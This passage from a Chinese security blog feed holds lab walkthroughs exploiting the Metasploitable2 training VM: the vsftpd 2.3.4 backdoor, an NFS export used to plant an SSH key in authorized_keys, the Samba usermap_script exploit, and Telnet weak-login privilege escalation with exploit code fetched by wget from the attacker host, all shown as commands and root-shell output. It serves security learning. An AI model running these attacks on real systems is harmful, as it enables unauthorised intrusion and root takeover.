代理服务</td></tr><tr><td>8008</td><td>http-alt</td><td>超文本传输协议（HTTP）的另一选择</td></tr><tr><td>8080</td><td>webcache</td><td>万维网（WWW）缓存服务</td></tr><tr><td>8081</td><td>tproxy</td><td>透明代理</td></tr><tr><td>9100&#x2F;tcp</td><td>jetdirect [laserjet, hplj]</td><td>Hewlett-Packard (HP) JetDirect 网络打印服务</td></tr><tr><td>9359</td><td>mandelspawn [mandelbrot]</td><td>用于 X 窗口系统的并行 Mandelbrot 生成程序</td></tr><tr><td>10081</td><td>kamanda</td><td>使用 Kerberos 的 Amanda 备份服务</td></tr><tr><td>10082&#x2F;tcp</td><td>amandaidx</td><td>Amanda 备份服务</td></tr><tr><td>10083&#x2F;tcp</td><td>amidxtape</td><td>Amanda 备份服务</td></tr><tr><td>20011</td><td>isdnlog</td><td>综合业务数字网（ISDN）登录系统</td></tr><tr><td>20012</td><td>vboxd</td><td>ISDN 音箱守护进程（vboxd）</td></tr><tr><td>22305&#x2F;tcp</td><td>wnn4_Kr</td><td>kWnn 韩文输入系统</td></tr><tr><td>22289&#x2F;tcp</td><td>wnn4_Cn</td><td>cWnn 中文输入系统</td></tr><tr><td>22321&#x2F;tcp</td><td>wnn4_Tw</td><td>tWnn 中文输入系统（台湾）</td></tr><tr><td>24554</td><td>binkp</td><td>Binkley TCP&#x2F;IP Fidonet 邮寄程序守护进程</td></tr><tr><td>27374</td><td>asp</td><td>地址搜索协议</td></tr><tr><td>60177</td><td>tfido</td><td>Ifmail FidoNet 兼容邮寄服务</td></tr><tr><td>60179</td><td>fido</td><td>FidoNet 电子邮件和新闻网络</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之vsftpd后门与linuxNFS共享目录配置漏洞</title>
    <link href="/blog/2020/05/05/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bvsftpd%E5%90%8E%E9%97%A8%E4%B8%8ElinuxNFS%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
    <url>/blog/2020/05/05/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bvsftpd%E5%90%8E%E9%97%A8%E4%B8%8ElinuxNFS%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><strong>继续上一篇的内容，本次使用的是vsftpd后门与linuxNFS共享目录配置漏洞和Samba3.X漏洞利用。</strong></p><p><img src="/images/fj46.jpg"></p><span id="more"></span><h2 id="vsftpd后门"><a href="#vsftpd后门" class="headerlink" title="vsftpd后门"></a>vsftpd后门</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><img src="/%5Cimages%5Cmetasploitable2-0.png"></p><p>发现21端口运行着vsftpd服务，版本是2.3.4</p><p>这个特别的版本包含一个后门允许一个未知的入侵者进入核心代码。这个后门很快就被确认并且移除。但是移除之前已经被少数人下载下来。如果在发送的用户名后面加上”：）“（笑脸符号），这个版本的后门会在6200端口上打开一个监听的shell。</p><p>我们可以通过telnet确认或者通过metasploit上面的攻击模块自动攻击。</p><h3 id="telnet手动利用"><a href="#telnet手动利用" class="headerlink" title="telnet手动利用"></a>telnet手动利用</h3><p>尝试连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.52.144 21<br>Trying 192.168.52.144...<br>Connected to 192.168.52.144.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>220 (vsFTPd 2.3.4)<br>user attack:)<br>331 Please specify the password.<br><br></code></pre></td></tr></table></figure><p>再开一个窗口，尝试使用telnet连接6200端口，并使用python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’获取伪终端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.52.144 6200<br>Trying 192.168.52.144...<br>Connected to 192.168.52.144.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br><span class="hljs-built_in">id</span>;<br>uid=0(root) gid=0(root)<br>: <span class="hljs-built_in">command</span> not found<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;<br>root@metasploitable:/<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>bin    dev   initrd      lost+found  nohup.out  root  sys  var<br>boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz<br>cdrom  home  lib         mnt         proc       srv   usr<br><br></code></pre></td></tr></table></figure><h3 id="MSF自动利用"><a href="#MSF自动利用" class="headerlink" title="MSF自动利用"></a>MSF自动利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 &gt; search vsftpd<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                  Disclosure Date  Rank       Check  Description</span><br>   -  ----                                  ---------------  ----       -----  -----------<br>   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution<br><br><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor<br>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options <br><br>Module options (exploit/unix/ftp/vsftpd_234_backdoor):<br><br>   Name    Current Setting  Required  Description<br>   ----    ---------------  --------  -----------<br>   RHOSTS                   <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT   21               <span class="hljs-built_in">yes</span>       The target port (TCP)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> rhost 192.168.52.144<br>rhost =&gt; 192.168.52.144<br><br>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit <br><br>[*] 192.168.52.144:21 - Banner: 220 (vsFTPd 2.3.4)<br>[*] 192.168.52.144:21 - USER: 331 Please specify the password.<br>[+] 192.168.52.144:21 - Backdoor service has been spawned, handling...<br>[+] 192.168.52.144:21 - UID: uid=0(root) gid=0(root)<br>[*] Found shell.<br>[*] Command shell session 1 opened (192.168.52.134:40789 -&gt; 192.168.52.144:6200) at 2020-05-05 16:14:46 +0800<br><br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>root@metasploitable:/<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root)<br>root@metasploitable:/<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><h2 id="linux-NFS共享目录配置漏洞"><a href="#linux-NFS共享目录配置漏洞" class="headerlink" title="linux NFS共享目录配置漏洞"></a>linux NFS共享目录配置漏洞</h2><h3 id="查看nfs是否开放"><a href="#查看nfs是否开放" class="headerlink" title="查看nfs是否开放"></a>查看nfs是否开放</h3><p>rpcinfo -p [target ip]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ rpcinfo -p 192.168.52.144<br>   program vers proto   port  service<br>    100000    2   tcp    111  portmapper<br>    100000    2   udp    111  portmapper<br>    100024    1   udp  38822  status<br>    100024    1   tcp  50018  status<br>    100003    2   udp   2049  nfs<br>    100003    3   udp   2049  nfs<br>    100003    4   udp   2049  nfs<br>    100021    1   udp  47531  nlockmgr<br>    100021    3   udp  47531  nlockmgr<br>    100021    4   udp  47531  nlockmgr<br>    100003    2   tcp   2049  nfs<br>    100003    3   tcp   2049  nfs<br>    100003    4   tcp   2049  nfs<br>    100021    1   tcp  52585  nlockmgr<br>    100021    3   tcp  52585  nlockmgr<br>    100021    4   tcp  52585  nlockmgr<br>    100005    1   udp  36165  mountd<br>    100005    1   tcp  39215  mountd<br>    100005    2   udp  36165  mountd<br>    100005    2   tcp  39215  mountd<br>    100005    3   udp  36165  mountd<br>    100005    3   tcp  39215  mountd<br></code></pre></td></tr></table></figure><h3 id="查看目标设置的共享目录列表"><a href="#查看目标设置的共享目录列表" class="headerlink" title="查看目标设置的共享目录列表"></a>查看目标设置的共享目录列表</h3><p>showmount -e [target ip]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ showmount -e 192.168.52.144<br>Export list <span class="hljs-keyword">for</span> 192.168.52.144:<br>/ *<br></code></pre></td></tr></table></figure><p>发现共享根目录下所有目录。</p><h3 id="生成rsa-公钥"><a href="#生成rsa-公钥" class="headerlink" title="生成rsa 公钥"></a>生成rsa 公钥</h3><p>ssh-keygen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ ssh-keygen <br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/xin/.ssh/id_rsa): <br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/xin/.ssh/id_rsa.<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/xin/.ssh/id_rsa.pub.<br>The key fingerprint is:<br>SHA256:1E7/aDLdsjBakGT1TaaGUsA1MEnTYZWqajDBoaPPjCs xin@kali<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|       o**Bo..o  |</span><br><span class="hljs-string">|    .   oB.+.=   |</span><br><span class="hljs-string">|   o .  = +.+ .  |</span><br><span class="hljs-string">|  o o  + =.o     |</span><br><span class="hljs-string">| . . .  S.. .    |</span><br><span class="hljs-string">|.   o   .. . +   |</span><br><span class="hljs-string">| =   o .  * = o  |</span><br><span class="hljs-string">|E +   o  o * o   |</span><br><span class="hljs-string">|o.   .  .   .    |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure><h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@kali:~$ <span class="hljs-built_in">mkdir</span> /tmp/msftables<br>xin@kali:~$ mount -o nolock -t nfs 192.168.52.144:/ /tmp/msftables<br>mount: only root can use <span class="hljs-string">&quot;--options&quot;</span> option<br>xin@kali:~$ sudo mount -o nolock -t nfs 192.168.52.144:/ /tmp/msftables<br>[sudo] xin 的密码：<br>xin@kali:~$ <span class="hljs-built_in">cat</span> /home/xin/.ssh/id_rsa.pub &gt;&gt; /tmp/msftables/root/.ssh/authorized_keys <br>bash: /tmp/msftables/root/.ssh/authorized_keys: 权限不够<br><br>xin@kali:~$ sudo <span class="hljs-built_in">cat</span> /home/xin/.ssh/id_rsa.pub &gt;&gt; /tmp/msftables/home/msfadmin/.ssh/authorized_keys <br>xin@kali:~$ ssh msfadmin@192.168.52.144<br>The authenticity of host <span class="hljs-string">&#x27;192.168.52.144 (192.168.52.144)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.52.144<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Ubuntu system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="hljs-string">applicable law.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To access official Ubuntu documentation, please visit:</span><br><span class="hljs-string">http://help.ubuntu.com/</span><br><span class="hljs-string">No mail.</span><br><span class="hljs-string">Last login: Tue May  5 04:14:33 2020</span><br><span class="hljs-string">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="hljs-string">See &quot;man sudo_root&quot; for details.</span><br><span class="hljs-string"></span><br><span class="hljs-string">msfadmin@metasploitable:~$ whoami</span><br><span class="hljs-string">msfadmin</span><br><span class="hljs-string">msfadmin@metasploitable:~$ </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>中间试着把认证公钥放到root目录下时显示权限不够，不得已只能放到用户目录下使用msfadmin权限，后面还可以使用之前的套路提权。</p><h2 id="samba-smbd-3-x"><a href="#samba-smbd-3-x" class="headerlink" title="samba smbd 3.x"></a>samba smbd 3.x</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 exploit(linux/samba/is_known_pipename) &gt; search samba<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                                 Disclosure Date  Rank       Check  Description</span><br>   -   ----                                                 ---------------  ----       -----  -----------<br>   0   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal<br>   1   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow<br>   2   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow<br>   3   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow<br>   4   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules<br>   5   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State<br>   6   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)<br>   7   exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)<br>   8   exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load<br>   9   exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow<br>   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow<br>   11  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)<br>   12  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow<br>   13  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba <span class="hljs-string">&quot;username map script&quot;</span> Command Execution<br>   14  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow<br>   15  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)<br>   16  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow<br>   17  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)<br>   18  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection<br>   19  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution<br>   20  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution<br>   21  exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution<br>   22  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow<br>   23  exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow<br>   24  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource<br>   25  post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations<br><br><br>msf5 exploit(linux/samba/is_known_pipename) &gt; use exploit/multi/samba/usermap_script <br>msf5 exploit(multi/samba/usermap_script) &gt; <span class="hljs-built_in">set</span> rhost 192.168.52.144<br>rhost =&gt; 192.168.52.144<br>msf5 exploit(multi/samba/usermap_script) &gt; show options <br><br>Module options (exploit/multi/samba/usermap_script):<br><br>   Name    Current Setting  Required  Description<br>   ----    ---------------  --------  -----------<br>   RHOSTS  192.168.52.144   <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT   139              <span class="hljs-built_in">yes</span>       The target port (TCP)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf5 exploit(multi/samba/usermap_script) &gt; exploit <br><br>[*] Started reverse TCP double handler on 192.168.52.134:4444 <br>[*] Accepted the first client connection...<br>[*] Accepted the second client connection...<br>[*] Command: <span class="hljs-built_in">echo</span> 7VUWl3ceAVJuDGMo;<br>[*] Writing to socket A<br>[*] Writing to socket B<br>[*] Reading from sockets...<br>[*] Reading from socket B<br>[*] B: <span class="hljs-string">&quot;7VUWl3ceAVJuDGMo\r\n&quot;</span><br>[*] Matching...<br>[*] A is input...<br>[*] Command shell session 2 opened (192.168.52.134:4444 -&gt; 192.168.52.144:60318) at 2020-05-05 17:10:26 +0800<br><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root)<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之Telnet的登录提权</title>
    <link href="/blog/2020/05/02/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BTelnet%E7%9A%84%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/"/>
    <url>/blog/2020/05/02/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BTelnet%E7%9A%84%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p><strong>继续上一篇的内容，本次使用的是Telnet的弱密码和登录提权。</strong></p><p><img src="/images/fj45.jpg"></p><span id="more"></span><h2 id="什么是Telnet？"><a href="#什么是Telnet？" class="headerlink" title="什么是Telnet？"></a>什么是Telnet？</h2><p>Telnet协议是TCP&#x2F;IP协议族中的一员，是internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。<br>虽然telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，telnet并不被重用。原因在于telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都以明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用telnet服务。如果我们要使用telnet的远程登录，使用前应在远端服务器上检查并设置允许telnet服务的功能。</p><h2 id="Telnet登录提权"><a href="#Telnet登录提权" class="headerlink" title="Telnet登录提权"></a>Telnet登录提权</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>扫描结果如下，我们发现23端口是开放的：</p><p><img src="/%5Cimages%5Cmetasploitable2-0.png"></p><p>打开msf，使用telnet_version模块来探测telnet的版本信息：</p><p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version</p><p>set rhost  192.168.52.144</p><p>run </p><p><img src="/%5Cimages%5Ctelnet0.png"></p><p>可以看到用户名密码都是msfadmin。</p><h3 id="msf尝试登录"><a href="#msf尝试登录" class="headerlink" title="msf尝试登录"></a>msf尝试登录</h3><p>然后使用登录模块尝试登录：</p><p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login </p><p>参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Module options (auxiliary/scanner/telnet/telnet_login):<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   <span class="hljs-literal">false</span>            no        Try blank passwords <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   BRUTEFORCE_SPEED  5                <span class="hljs-built_in">yes</span>       How fast to bruteforce, from 0 to 5<br>   DB_ALL_CREDS      <span class="hljs-literal">false</span>            no        Try each user/password couple stored <span class="hljs-keyword">in</span> the current database<br>   DB_ALL_PASS       <span class="hljs-literal">false</span>            no        Add all passwords <span class="hljs-keyword">in</span> the current database to the list<br>   DB_ALL_USERS      <span class="hljs-literal">false</span>            no        Add all <span class="hljs-built_in">users</span> <span class="hljs-keyword">in</span> the current database to the list<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT             23               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   STOP_ON_SUCCESS   <span class="hljs-literal">false</span>            <span class="hljs-built_in">yes</span>       Stop guessing when a credential works <span class="hljs-keyword">for</span> a host<br>   THREADS           1                <span class="hljs-built_in">yes</span>       The number of concurrent threads (max one per host)<br>   USERPASS_FILE                      no        File containing <span class="hljs-built_in">users</span> and passwords separated by space, one pair per line<br>   USER_AS_PASS      <span class="hljs-literal">false</span>            no        Try the username as the password <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           <span class="hljs-literal">true</span>             <span class="hljs-built_in">yes</span>       Whether to <span class="hljs-built_in">print</span> output <span class="hljs-keyword">for</span> all attempts<br><br></code></pre></td></tr></table></figure><p>设置用户名、口令对应的文件路径，然后设置目标，run即可：</p><p><img src="/%5Cimages%5Ctelnet1.png"></p><p>这个只是获取的msfadmin权限的shell，我们可以用sessions -u [id]把相应的连接设置成<strong>meterpreter shell</strong></p><p><img src="/%5Cimages%5Ctelnet2.png"></p><p><strong>meterpreter shell</strong>是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。包括提权、转存系统账号、键盘记录、持久后门服务、启用远程桌面等，还有很多其他的扩展。而且，<strong>meterpreter</strong> shell的整个通信都是默认加密的。</p><h3 id="利用exp提权"><a href="#利用exp提权" class="headerlink" title="利用exp提权"></a>利用exp提权</h3><p>从 <a href="https://www.exploit-db.com/download/8572">https://www.exploit-db.com/download/8572</a></p><p>下载exp，放到kali的&#x2F;var&#x2F;www&#x2F;html目录下，并将下载的C文件chmod 777 </p><p>然后开启apache服务：service apache2 start</p><p>然后切换到靶机telnet，从kali下载提权代码并编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfadmin@metasploitable:~$ wget 192.168.52.134/test.c<br>--22:00:56--  http://192.168.52.134/test.c<br>           =&gt; `test.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Connecting to 192.168.52.134:80... connected.</span><br><span 